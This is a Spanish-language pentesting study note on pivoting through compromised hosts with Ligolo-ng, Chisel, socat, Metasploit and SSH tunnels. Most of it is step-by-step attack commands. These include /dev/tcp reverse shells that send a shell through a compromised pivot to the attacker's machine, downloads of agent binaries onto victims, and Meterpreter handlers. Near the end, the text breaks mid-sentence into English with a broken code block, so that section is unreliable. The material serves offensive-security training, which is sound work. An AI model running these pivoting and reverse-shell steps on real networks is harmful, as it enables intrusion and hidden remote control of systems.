
# Tunnelling (túnel), port forward (reenvío de puertos) y pivoting

Ejemplo de escenario:

Imaginemos que hemos conseguido acceso a un servidor web, esto significa que estaremos en la DMZ. Esto son los servidores que están expuestos a Internet. Pero están conectados a la red interna. A la red interna no se puede acceder, por ello necesitamos hacer pivoting desde el punto DMZ que sí tiene conexión hacia ella.

Imaginemos que tenemos la Kali como máquina atacante y tiene conexión a máquina 1. Máquina 2 solo tiene conexión con máquina 1. Así que necesitamos comprometer a máquina 1 para poder intentar pivotar a máquina 2. Así que hay dos redes.

Atacante: red 1 (10.10.10.7)
Máquina 1:  red 1 (10.10.10.4) y red 2 (20.20.20.5)
Máquina 2: red 2 (20.20.20.4)

## Ligolo-ng

Herramienta que sustituye las configuraciones complejas de chisel, sockat y proxichains. 

Permite crear túneles muy fácil.

Github:
https://github.com/nicocha30/ligolo-ng

Pulsamos en releases:

![[Pasted image 20250806213454.png]]


Necesitamos el agente (agent) que es el agente que se conecta al servidor y el proxy que es el servidor.


Descargamos los dos en Kali (atacante):
- El proxy lo descargamos en Kali (atacante) y se quedará ahí.
- El agente lo descargamos en kali pero tenemos que pasarlo a máquina 1 porque es la máquina cliente que se va a conectar al servidor que es el proxy.

Para descomprimirlos:

```
tar -xf <nombre>
```

Descomprimimos tanto el proxy como el agent en la máquina Kali.

Ahora pasamos el agent a la víctima, una de las formas es abriendo un servidor python (dentro de la carpeta donde están estos ficheros) en la máquina atacante:

```
python3 -m http.server <puerto>
```

Y ahora desde máquina 1 intentamos descargarnos el agent:

```
wget http://<IP-atacante>:<puertoAtacante>/agent
```

Una vez descargado dentro de la máquina 1, le damos permisos de ejecución desde máquina 1:

```
chmod +x agent
```

Ahora desde la máquina atacante, ejecutamos proxy que es el servidor, con un certificado firmado:

```
./proxy -selfcert
```

Pulsamos Y (Yes/sí) en ambas preguntas y comienza. Se queda a la escucha en 0.0.0.0 (es decir, la IP de la atacante) y te indica el puerto, en este caso por ejemplo 11601.

Ahora en máquina 1:

```
./agent -connect <IP-atacante>:<puertoQueDaLigolo> -ignore-cert
```

Ahora hay conexión entre atacante y máquina 1. Ahora debemos activar el túnel.

Para crear el túnel, debemos crear una nueva interfaz de red.

Abrimos un terminal en kali y creamos una interfaz de red:

```
sudo ip tuntap add user <nombreUserDeKali> mode tun ligolo
```

Levantamos la interfaz:

```
sudo ip link set ligolo up
```

Ya tenemos esa nueva interfaz, pero ahora debemos crear una ruta donde queremos llegar.

Para saber dónde queremos llegar, en máquina 1 hacemos ifconfig y vemos las demás redes, en este caso sería la 20. Así que desde kali otra vez, añadimos esta ruta de red:

```
sudo ip route add 20.20.20.0/24 dev ligolo
```

Y si hago ifconfig veo esta interfaz en Kali, que se llama ligolo.

Ahora desde atacante puedo tener acceso a esta red siempre y cuando active el túnel.

Así que en la terminal donde está ligolo en la atacante:

```
ligolo> session
```

Si solo hay una pues poner 1.

Y poner:

```
ligolo> start
```

Para empezar el túnel.

Y ahora si desde kali abro una terminal y hago ping a la máquina 2, ya puedo.

Ahora tengo acceso desde kali a máquina 2, pero máquina 2 no tiene acceso a kali. Para ello, en la terminal de kali donde está ligolo:

```
ligolo> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
```

Ponemos un puerto a la escucha. Así estamos diciendo que la IP del agente (0.0.0.0), la de máquina 1, quiere estar a la escucha en el puerto 8080 por ejemplo. Y todo lo que reciba por el puerto 8080, lo envíe a la máquina atacante por el puerto 80. 

Y si hacemos este comando podemos ver que se ha creado bien:

```
ligolo> listener_list
```

Así hemos hecho redirección de puertos (port forwarding).

Ahora desde kali:

```
python3 -m http.server 80
```

Si ahora desde máquina 2 hacemos:

```
curl http://<IP-kali>:80
```

No funcionará, porque el port forward es desde la máquina 1 (es la pivoting). 

Así que sería hacer esto desde máquina 2:

```
curl http://<IP-maquina1>:8080
```

Porque lo que habíamos hecho es decirle que redirija todo el tráfico que reciba máquina 1 por el puerto 8080, a kali por el 80. Y ahora sí que kali recibe las conexiones de máquina 2.

Ahora si queremos una reverse shell, desde kali hacemos:

```
nc -nlvp 4444
```

Y desde kali pero desde el proxy de ligolo hacemos otro listener:

```
ligolo> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

Todo lo que reciba máquina 1 por el puerto 4444, lo devuelve a kali por el 4444.

Ahora desde máquina 2  hacemos reverse shell a máquina 1 (y ligolo lo redirige a kali):

```
sh -i >& /dev/tcp/20.20.20.5/4444 0>&1
```

Y antes de darle a enter, poner en kali el puerto a la escucha:

```
sudo nc -nlvp 4444
```

Y ahora tengo reverse shell entre kali y máquina 2, con el túnel creado con máquina 1.


## Chisel

Es más sencillo usar Ligolo, que Chisel. 

Cuando usar Chisel:
- Solo necesitas **reenviar un puerto** (ej: exponer un puerto local de la víctima a tu equipo).
- La máquina víctima tiene muchas restricciones y no puedes ejecutar Ligolo (por ejemplo, antivirus, sandboxing, sin permisos para crear interfaces TUN).
- Quieres hacer algo rápido y **ligero** (como conectar a un puerto RDP, HTTP interno, etc).

Ejemplo de escenario:
- Kali atacante (10.10.10.12)
- Máquina 1 (10.10.10.13 y 20.20.20.13)
- Máquina 2 (20.20.20.14 y 30.30.30.12)
- Máquina 3 (30.30.30.14)

Ahora mismo kali solo tiene acceso a máquina 1.

Así que kali puede conectarse por ssh a máquina 1:
ssh maquina1@10.10.10.13 y ponemos contraseña. Estamos en máquina 1.

Ahora si kali quiere acceder a un servicio web de máquina 2, no puede. Máquina 1 sí, pero kali no.

Descargamos chisel para port forwarding (para llegar al puerto 80 de la máquina 2 desde kali). Para ello ejecutamos chisel en la máquina 1 que es la que está en medio y a través de ello kali podra acceder a máquina 2.

https://github.com/jpillora/chisel

Pulsamos en releases y descargamos el fichero (el que sea para el SO de la máquina 1).

Lo descargamos en kali y lo descomprimimos:

```
gunzip <fichero>
```

Damos permisos de ejecución:

```
chmod +x <chisel>
```


Ponemos a chisel escuchando por un puerto que queramos (desde kali) para que espere conexiones (espera al túnel):

```
./chisel server --reverse -p <puertoElegir>
```

Ahora en la máquina intermedia (máquina 1), que tenemos acceso desde kali por ssh (en este caso), debemos también ejecutar chisel.

Para ello, transferimos el fichero de kali a máquina 1, por ejemplo con servidor python y lo descargamos en máquina 1.

Si para descargar no tiene wget, descargar con:

```
curl http://<IP-kali>:<puertoserverPython>/chisel -o chisel
```

Le damos permisos con chmod +x.

Ahora dentro de máquina 1 debemos hacer el port forwarding:

```
./chisel client <ipKali>:<puertoEscuchandokali> R:<puertomaquina2>
```

Y así veríamos el puerto 80 por ejemplo de máquina 2, con kali.

Pero también podemos poner:

```
./chisel client <ipKali>:<puertoEscuchandokali> R:socks
```

Para poder ver todos los puertos.

Así se ha creado un túnel y te dice en qué puerto.

Ahora si desde kali en el navegador ponemos la ip de la máquina 2, no va a funcionar aunque tengamos el port forwarding. Porque no hemos accedido por el túnel.

Para ello, dentro del kali:

```
nano /etc/proxychains4.conf
```

Dentro de este fichero de configuración debemos añadir abajo del todo:

```
socks5 127.0.0.1 <puertoQueRecibeChiselEnKali>
```

Y ahora en el navegador, vamos a configuración > proxy, seleccionamos manual proxy.

Dentro de ahí, en donde pone socks host ponemos 127.0.0.1 y el puerto.

Entonces ahora desde el navegador ya podemos acceder.

Aunque ahora kali ve a máquina 2, pero al revés no. Así que si hacemos una reverse shell, no va a funcionar.

Además, si ahora desde kali hago:

```
whatweb 20.20.20.14
```

Aunque en el navegador funcione, aquí no, porque no está el proxy. Para ello:

```
proxychains whatweb 20.20.20.14
```

Igual que otras herramientas como nmap, entre otras. El túnel está en proxychains, sino no funciona.

Desde máquina 2, no puede hacer nada hacia kali, es porque hay que ejecutar socat en máquina 1.

Ahora desde máquina 1, sin cerrar el otro túnel, hay que descargar socat para poder hacer una reverse shell.

Desde kali vamos a:

https://github.com/andrew-d/static-binaries

Pulsamos en Raw y se descarga.

Abrimos un server python y lo descargamos en máquina 1.

Ahora en máquina 1:

```
./socat tcp-l:1111,fork,reuseaddr tcp:<IPkali>:<puertoQueQuiera>
```

Así la revshell que reciba por el puerto 1111 (por ejemplo), lo envíe a la atacante por el que elija (por ejemplo 111).

En el ejemplo:

```
./socat tcp-l:1111,fork,reuseaddr tcp:<IPkali>:111
```

En kali:

```
nc -nlvp <puertoQueHayaELegidoEnKali>
```

En el ejemplo:

```
nc -nlvp 111
```

Ahora en máquina 2:

```
sh -i >& /dev/tcp/<IPmaquina1QueTengaconexionconmaquina2>/<puertoQueHayaELegidoEnKali> 0>&1
```

En el ejemplo:

```
sh -i >& /dev/tcp/20.20.20.13/1111 0>&1
```

Y así se recibe la conexión desde máquina 2, a través de máquina 1, en kali.

Chisel es para el port forwarding y socat para la revshell.

Y ahora para la máquina 3 hay que hacer lo mismo. Habría que poner chisel en máquina 2 y un port fowarding desde la 3 a kali.


## Metasploit

Ejemplo de escenario:
- Kali atacante (192.168.0.30)
- Máquina 1 (192.168.0.36 y 10.10.10.4)
- Máquina 2 (10.10.10.5)

Kali tiene conexión con máquina 1, pero no con máquina 2. Máquina 1 será la intermedia.

Desde Kali arrancamos Metasploit:

```
msfconsole
```

Ahora dentro de Metasploit buscamos el multi handler para ponerlo a la escucha:

```
msf> search /multi/handler
```

Lo seleccionamos y configuramos:

```
msf> use /multi/handler
msf> options
msf> set LHOST <IPKALI>
msf> set LPORT <puertoKaliQueQueramos>
```

Seleccionar un payload:

```
set payload <unoQueTengaMeterpreter>
```

Ejemplo:

```
set payload linux/x86/meterpreter/reverse_tcp
```

Buscamos que sea una sesión meterpreter porque así podemos hacer el pivoting.

Lanzamos y se queda a la escucha:

```
msf> run
```

Ahora desde máquina 1 podemos crear un msfvenom, o una revshell tal cual, etc.

Por ejemplo, en máquina 1:

```
bash -i >& /dev/tcp/<IPkali>/<puertoElegidoEnHandler> 0>&1
```

```
bash -i >& /dev/tcp/192.168.0.30/4444 0>&1
```


Una vez consigo sesión meterpreter, podemos poner ipconfig y ver las interfaces de red de máquina 1. 

```
meterpreter> ipconfig
```

Veo cuál es la IP que quiero acceder, la que no llego desde kali, en este caso la 10.10.10.6. Por tanto, debo redireccionar el tráfico de la IP 10 a mi máquina atacante, desde la conexión que tengo en máquina 1.

En meterpreter pulsar control+z para dejar la sesión en background. Y ahora en metasploit:

```
msf> route add <IPmáquina2> <maquina2-mascarasubred> <numeroSesionEnBackgound>
```

```
msf> route add 10.10.10.6 255.255.255.255.0 1
```

Así todo el tráfico de la máquina 2 pasará a la atacante.

Y ahora hay que hacer el port forwarding. 

Accedemos a la sesión de Metasploit. Vemos qué sesiones hay abiertas:

```
msf> sessions -l
```

Si está en la 1:

```
msf> sessions -i 1
```

Ahora creamos el portforward:

```
meterpreter> portfwd add -l <puertoAtacante> -p <puertoMaquina2> -r <IPmaquina2>
```

Ejemplo:

```
meterpreter> portfwd add -l 5000 -p 80 -r 10.10.10.5
```

En este caso, en el puerto 5000 de la atacante, tendré acceso al puerto 80 de la objetivo (máquina 2).

Ahora si desde kali vamos al navegador y ponemos 127.0.0.1:5000 podemos acceder al puerto 80 de la atacante.

Y si ahora quermos otro puerto, ejemplo:

```
meterpreter> portfwd add -l 4000 -p 21 -r 10.10.10.5
```

Y ahora desde kali en una terminal:

```
ftp 127.0.0.1 -p 4000
```

Es como si accediese al 21 de la máquina 2 desde kali.


----
## SSH Tunnelling (túnel SSH)

El protocolo SSH tiene integrada una funcionalidad para realizar el reenvío de puertos a través de una característica llamada SSH tunneling.

Aunque SSH solía ser un protocolo asociado a los sistemas Linux, Windows ahora incluye el cliente OpenSSH de forma predeterminada, por lo que es probable que lo encuentres en muchos sistemas actuales, independientemente de su sistema operativo.

El túnel SSH se puede utilizar de diferentes maneras para reenviar puertos a través de una conexión SSH, que utilizaremos dependiendo de la situación. 

Para explicar cada caso, supongamos un escenario en el que hemos obtenido el control de la máquina PC-1 (no es necesario tener acceso de administrador) y queremos utilizarla como pivote para acceder a un puerto de otra máquina a la que no podemos conectarnos directamente. Iniciaremos un túnel desde la máquina PC-1, que actuará como cliente SSH, hasta el PC del atacante, que actuará como servidor SSH. La razón para hacerlo es que a menudo se encuentra un cliente SSH en máquinas Windows, pero la mayoría de las veces no hay ningún servidor SSH disponible.

Dado que vamos a establecer una conexión con la máquina del atacante, queremos crear un usuario en ella sin acceso a ninguna consola para el túnel y establecer una contraseña que se utilizará para crear los túneles:

```shell-session
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

Dependiendo de sus necesidades, el túnel SSH se puede utilizar para realizar un reenvío de puertos local o remoto. Vemos los casos a continuación.

### SSH Remote Port Forwarding

En nuestro ejemplo, supongamos que las políticas del firewall impiden que la máquina del atacante acceda directamente al puerto 3389 del servidor. Si el atacante ha comprometido previamente el PC-1 y, a su vez, el PC-1 tiene acceso al puerto 3389 del servidor, puede utilizarlo para pivotar al puerto 3389 mediante el reenvío de puertos remotos desde el PC-1. El **reenvío de puertos remoto** le permite tomar un puerto accesible del cliente SSH (en este caso, el PC-1) y proyectarlo en un servidor SSH **remoto** (la máquina del atacante).

Como resultado, se abrirá un puerto en la máquina del atacante que se puede utilizar para conectarse de nuevo al puerto 3389 del servidor a través del túnel SSH. El PC-1, a su vez, actuará como proxy de la conexión para que el servidor vea todo el tráfico como si proviniera del PC-1:

Una pregunta que podría surgir en este punto es por qué necesitamos el reenvío de puertos si hemos comprometido el PC-1 y podemos ejecutar una sesión RDP directamente desde allí. La respuesta es sencilla: en una situación en la que solo tenemos acceso a la consola del PC-1, no podremos utilizar ningún cliente RDP, ya que no disponemos de una interfaz gráfica de usuario (GUI). Al hacer que el puerto esté disponible para la máquina del atacante, se puede utilizar un cliente RDP de Linux para conectarse. Situaciones similares se producen cuando se desea ejecutar un exploit contra un puerto al que no se puede acceder directamente, ya que el exploit puede requerir un lenguaje de scripting específico que no siempre está disponible en las máquinas que se comprometen en el proceso.

Para reenviar el puerto 3389 del servidor a la máquina del atacante, podemos utilizar el siguiente comando en el PC-1:

```shell-session
cmd> ssh <usuario_ssh>@<IP_PC-1> -R <puerto_expuesto_en_PC-1>:<IP_destino_final>:<puerto_destino> -N
```

- `<usuario_ssh>` → Usuario del **servidor SSH (PC-1)**.
- `<IP_PC-1>` → IP del **servidor SSH (PC-1)** que recibe el túnel.
- `<puerto_expuesto_en_PC-1>` → Puerto en **PC-1** que quedará abierto para redirigir tráfico.
- `<IP_destino_final>` → IP del host al que finalmente se enviará el tráfico (por ejemplo, servidor RDP).
- `<puerto_destino>` → Puerto en el host final (por ejemplo, **3389** para RDP).


El -N es usado si el usuario no tiene permiso para ejecutar un shell en el PC del atacante.

El comando en sí no muestra ningún resultado, pero el túnel depende de que se ejecute el comando. Podemos cerrar el túnel en cualquier momento como cualquier otro comando con CTRL+C.  

Una vez que nuestro túnel está configurado y en funcionamiento, podemos ir al ordenador del atacante e iniciar sesión en el puerto reenviado a través de RDP para acceder al servidor:

Ordenador del atacante

```shell-session
munra@attacker-pc$ xfreerdp /v:<127.0.0.1> /u:<MyUser> /p:<MyPassword>
```

### SSH Local Port Forwarding

**El reenvío de puertos locales** nos permite «extraer» un puerto de un servidor SSH al cliente SSH. En nuestro escenario, esto podría utilizarse para tomar cualquier servicio disponible en la máquina del atacante y hacerlo disponible a través de un puerto en el PC-1. De esta forma, cualquier host que no pueda conectarse directamente al PC del atacante, pero que pueda conectarse al PC-1, podrá ahora acceder a los servicios del atacante a través del host pivote.

El uso de este tipo de reenvío de puertos nos permitiría ejecutar shells inversos desde hosts que normalmente no podrían conectarse con nosotros o simplemente hacer que cualquier servicio que queramos esté disponible para máquinas que no tienen conexión directa con nosotros.


```shell-session
cmd> ssh <usuario_ssh>@<IP_servidor_ssh> -L <ip_local_o_*>:<puerto_local>:<ip_destino_remoto>:<puerto_destino> -N
```

Ejemplo:

```
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

- Escucha en todas las interfaces locales (`*`) en el puerto `80`.
- Redirige a `127.0.0.1:80` **desde la perspectiva del servidor SSH (1.1.1.1)**.

## Port Forwarding with socat

En situaciones en las que SSH no está disponible, se puede utilizar socat para realizar una función similar. Aunque no es tan flexible como SSH, socat permite reenviar puertos de una forma mucho más sencilla. Una de las desventajas de utilizar socat es que hay que transferirlo al host pivote (PC-1 en nuestro ejemplo actual), lo que lo hace más detectable que SSH, pero puede merecer la pena probarlo cuando no hay otras opciones disponibles.

La sintaxis básica para realizar el reenvío de puertos con socat es mucho más sencilla. Si quisiéramos abrir el puerto 1234 en un host y reenviar cualquier conexión que recibamos allí al puerto 4321 del host 1.1.1.1, tendríamos el siguiente comando:

```shell-session
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

La opción `fork` permite a socat bifurcar un nuevo proceso para cada conexión recibida, lo que hace posible gestionar múltiples conexiones sin cerrar. Si no la incluyes, socat se cerrará cuando finalice la primera conexión establecida.

Volviendo a nuestro ejemplo, si quisiéramos acceder al puerto 3389 del servidor utilizando el PC-1 como pivote, tal y como hicimos con el reenvío de puertos remotos SSH, podríamos utilizar el siguiente comando:

```shell-session
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

Si, por el contrario, queremos exponer el puerto 80 desde la máquina del atacante para que sea accesible desde el servidor, solo tenemos que ajustar un poco el comando:

```shell-session
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```


### Dynamic Port Forwarding and SOCKS

Aunque el reenvío de puertos único funciona bastante bien para tareas que requieren acceso a sockets específicos, hay ocasiones en las que puede que necesitemos realizar escaneos en muchos puertos de un host, o incluso en muchos puertos de muchas máquinas, todo ello a través de un host pivote. En esos casos, el **reenvío dinámico de puertos** nos permite pivotar a través de un host y establecer varias conexiones a cualquier dirección IP/puerto que queramos utilizando un **proxy SOCKS**.

Dado que no queremos depender de un servidor SSH existente en las máquinas Windows de nuestra red de destino, normalmente utilizaremos el cliente SSH user@1.1.1.1 -R 9050 -N

```

In this case, the SSH server will start a SOCKS proxy on port `9050`, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using **proxychains**. To do so, we first need to make sure that proxychains is correctly configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains.conf` on your AttackBox. If we scroll down to the end of the configuration file, we should see a line that indicates the port in use for socks proxying:

```shell-session
[ProxyList]
socks4  127.0.0.1 9050
```

El puerto predeterminado es el 9050, pero cualquier puerto funcionará siempre que coincida con el que utilizamos al establecer el túnel SSH.

Si ahora queremos ejecutar cualquier comando a través del proxy, podemos utilizar proxychains:

```shell-session
proxychains curl http://<dominio>
```

Tenga en cuenta que algunos programas, como nmap, pueden no funcionar bien con SOCKS en determinadas circunstancias y mostrar resultados alterados, por lo que los resultados pueden variar.

## Túnel SSH local vs remoto

Supón que en el servidor remoto hay un servicio web corriendo en el puerto 80, pero no está disponible desde fuera de su red.

Con un túnel SSH local puedes hacer esto:

```
ssh usuario@servidor_remoto -L 8080:localhost:80
```

Esto significa que cuando en tu computadora abras `http://localhost:8080`, estarás viendo el servicio web que está en el servidor remoto en su puerto 80, pero **todo viaja cifrado** a través de SSH.

Ejemplo:
```
ssh usuario@192.168.2.105 -L 9999:192.168.2.200:80
```

Luego se puede:
nmap -p 8080 localhost


Esto significa que al abrir `localhost:9999` en tu máquina, realmente estás viendo el servicio web en el equipo `192.168.2.200` dentro de la red del servidor, a través del túnel SSH.

Con -L solo puedes ver un servicio en específico, en este caso el servicio web.

Con -D es como crear un túnel para navegar por toda la red del servidor remoto.

```
ssh usuario@servidor_remoto -D 1080
```
